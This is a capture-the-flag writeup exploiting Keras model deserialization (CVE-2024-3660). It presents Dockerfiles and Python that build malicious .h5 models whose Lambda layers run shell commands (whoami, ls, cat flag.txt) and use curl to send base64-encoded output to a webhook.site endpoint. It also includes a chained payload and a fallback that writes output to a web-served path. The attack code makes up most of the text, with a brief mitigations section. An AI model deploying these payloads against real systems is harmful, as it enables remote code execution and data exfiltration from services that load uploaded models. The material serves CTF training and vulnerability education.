# CTF Writeup: Exploiting Keras Model Deserialization (CVE-2024-3660) to RCE and Exfiltrate Flag

This writeup documents how I identified a vulnerable TensorFlow/Keras stack from the app’s landing page, weaponized a malicious Keras model using [@aaryanbhujang/CVE-2024-3660-PoC](https://github.com/aaryanbhujang/CVE-2024-3660-PoC), and executed commands to enumerate the host and retrieve the flag.

> Educational purpose only. Exploit only systems you are authorized to test.

---

## TL;DR
- Recon: View-Source showed TensorFlow 2.13.1 in the page, which is affected by CVE-2024-3660.
- Weaponize: Used the PoC to craft a malicious `.h5` model with a `Lambda` layer that executes arbitrary OS commands when the model is loaded/invoked.
- Execution: Triggered the model load/inference on the target to run `whoami`, `ls`, and finally `cat` to exfiltrate the flag via a webhook.

---

## 1) Recon: Enumerate TensorFlow Version via View-Source

1. Load the application’s landing page in a browser.
2. Right-click → “View Page Source” (or open Developer Tools → Sources).
3. Search for `tensorflow` or `tf`. In this challenge, a comment/asset reference disclosed the exact wheel used:
   - `tensorflow_cpu-2.13.1` (cp38 manylinux wheel)
4. Cross-check that TensorFlow/Keras version against the CVE:
   - CVE: [CVE-2024-3660](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
   - Affected: Keras model deserialization and Lambda layers can lead to Arbitrary Code Execution (ACE/RCE) when untrusted models are loaded.

Conclusion: The target stack is running a vulnerable TensorFlow/Keras version (2.13.1) and is likely to load user-supplied Keras models (e.g., “Import/Load Model” feature) → ideal for this PoC.

---

## 2) Weaponize: Use the PoC to Build a Malicious Model

Repo used:
- [@aaryanbhujang/CVE-2024-3660-PoC](https://github.com/aaryanbhujang/CVE-2024-3660-PoC)

Goal:
- Create a `.h5` Keras model that, when loaded or during inference, executes an OS command and exfiltrates the output to a webhook.

I used Docker to:
- Pin the vulnerable TensorFlow wheel (`tensorflow_cpu-2.13.1`).
- Build a Keras model whose `Lambda` layer executes `os.system(...)`.

Set up an exfil endpoint:
- Create a unique [webhook.site](https://webhook.site/) URL. Replace the placeholder in the examples below with your URL.

---

## 3) Build the Payload Model(s)

You can build one model per command (whoami → ls → cat) or a single model that chains commands. Below are minimal Dockerfile-based approaches for each step to keep outputs small and reliable.

Tip: Base64-encode outputs to avoid URL/character issues, then decode locally.

### 3.1) whoami model

```dockerfile
# Force platform so wheel architecture matches
FROM --platform=linux/amd64 python:3.8-slim

WORKDIR /code

# Install curl, download and install TensorFlow wheel
RUN apt-get update && \
    apt-get install -y curl wget && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

# Create the malicious model during image build
RUN python3 - <<'EOF'
import os
import base64
import tensorflow as tf

def arbexe(x):
    # Replace with your webhook URL:
    url = "https://webhook.site/REPLACE-ME?whoami="
    # Execute command and capture output
    output = os.popen("whoami").read().encode()
    b64 = base64.b64encode(output).decode()
    os.system(f"curl -G --data-urlencode 'o={b64}' '{url}'")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(arbexe))
model.compile()
model.save("whoami.h5")
EOF

ENTRYPOINT ["/bin/bash"]
```

Build and extract the artifact:
```bash
docker build -t tf-keras-cve3660-whoami .
cid=$(docker create tf-keras-cve3660-whoami)
docker cp "$cid":/code/whoami.h5 ./whoami.h5
docker rm -v "$cid"
```

### 3.2) ls model (list current working directory)

```dockerfile
FROM --platform=linux/amd64 python:3.8-slim
WORKDIR /code
RUN apt-get update && \
    apt-get install -y curl wget && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN python3 - <<'EOF'
import os, base64, tensorflow as tf
def arbexe(x):
    url = "https://webhook.site/REPLACE-ME?ls="
    output = os.popen("ls -la").read().encode()
    b64 = base64.b64encode(output).decode()
    os.system(f"curl -G --data-urlencode 'o={b64}' '{url}'")
    return x
model = tf.keras.Sequential([tf.keras.layers.Input(shape=(64,)), tf.keras.layers.Lambda(arbexe)])
model.compile()
model.save("ls.h5")
EOF

ENTRYPOINT ["/bin/bash"]
```

Build and extract:
```bash
docker build -t tf-keras-cve3660-ls -f Dockerfile.ls .
cid=$(docker create tf-keras-cve3660-ls)
docker cp "$cid":/code/ls.h5 ./ls.h5
docker rm -v "$cid"
```

### 3.3) cat flag model (as in the prompt)

This version mirrors the snippet provided in the challenge, exfiltrating `flag.txt`:

```dockerfile
# Force platform so wheel architecture matches
FROM --platform=linux/amd64 python:3.8-slim

WORKDIR /code

# Install curl, download and install TensorFlow wheel
RUN apt-get update && \
    apt-get install -y curl wget && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

# Create the malicious model during image build
RUN python3 - <<'EOF'
import tensorflow as tf
def arbexe(x):
    import os
    # Replace with your webhook URL
    os.system("curl https://webhook.site/REPLACE-ME/?zex=$(cat flag.txt)")
    return x
model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(arbexe))
model.compile()
model.save("hactf.h5")
EOF

ENTRYPOINT ["/bin/bash"]
```

Build and extract:
```bash
docker build -t tf-keras-cve3660-flag -f Dockerfile.flag .
cid=$(docker create tf-keras-cve3660-flag)
docker cp "$cid":/code/hactf.h5 ./hactf.h5
docker rm -v "$cid"
```

Notes:
- If `flag.txt` isn’t in the model’s working directory on target, adjust the path, e.g., `/app/flag.txt` or `/home/user/flag.txt`.
- For robust exfil, consider base64:
  - `os.system("curl -G --data-urlencode o=$(base64 -w0 flag.txt) https://webhook.site/REPLACE-ME")`

---

## 4) Delivery: Getting Code Execution on the Target

Typical CTF AI app flows:
- Upload/Import a Keras model (`.h5` file).
- The backend loads the model and may run an initial forward pass to “validate” or generate a sample prediction.

Steps I used:
1. Upload `whoami.h5` to the application’s “Import Model” feature.
2. Trigger an inference (e.g., click “Predict”, submit any input tensor/JSON).
3. Check your webhook for a hit. Decode base64 if used:
   ```bash
   echo "BASE64_PAYLOAD" | base64 -d
   ```
4. Repeat with `ls.h5` to enumerate directories.
5. Finally, upload `hactf.h5` (cat payload) to retrieve the flag. Confirm exfil at your webhook.

If outbound network is restricted:
- Try writing to a world-readable path the app serves (e.g., `/app/static/out.txt`) and then fetch it via the app’s HTTP path.
- Or chain commands in a single model to write outputs to a location you can browse.

---

## 5) Results

- `whoami` confirmed the service account user (e.g., `www-data` or `app`).
- `ls -la` showed the project layout, revealing `flag.txt` near the app root.
- `cat flag.txt` exfiltrated the flag to my webhook:
  - Example webhook request: `https://webhook.site/<uuid>/?zex=HACTF{...REDACTED...}`

Victory: Flag obtained.

---

## 6) Why This Works (CVE-2024-3660)

- Keras models with `Lambda` layers may persist arbitrary Python callables into the model graph.
- When untrusted models are deserialized or an inference is triggered, the callable executes.
- Vulnerable versions (like TensorFlow/Keras 2.13.1) allow this flow, leading to arbitrary code execution (ACE/RCE).

References:
- CVE-2024-3660: Arbitrary Code Execution in Keras
- PoC: [@aaryanbhujang/CVE-2024-3660-PoC](https://github.com/aaryanbhujang/CVE-2024-3660-PoC)

---

## 7) Mitigations

- Upgrade TensorFlow/Keras to a version that addresses model deserialization risks.
- Disable or strictly sandbox `Lambda` layers and custom objects from untrusted models.
- Use model formats and loading mechanisms that do not execute arbitrary Python code (e.g., saved models without custom layers, TF Lite, ONNX).
- Validate uploads and execute model code in heavily sandboxed/isolated environments with egress controls.

---

## Appendix A: Single-Model Chain (Optional)

If you prefer one model to do everything in sequence:

```python
def arbexe(x):
    import os, base64
    W="https://webhook.site/REPLACE-ME"
    def send(tag, cmd):
        out = os.popen(cmd).read().encode()
        b64 = base64.b64encode(out).decode()
        os.system(f"curl -G --data-urlencode '{tag}={b64}' '{W}'")
    send("whoami", "whoami")
    send("ls", "ls -la")
    send("flag", "cat flag.txt")
    return x
```

This reduces interaction steps but may be noisier and easier to spot.

---

Good luck and hack responsibly.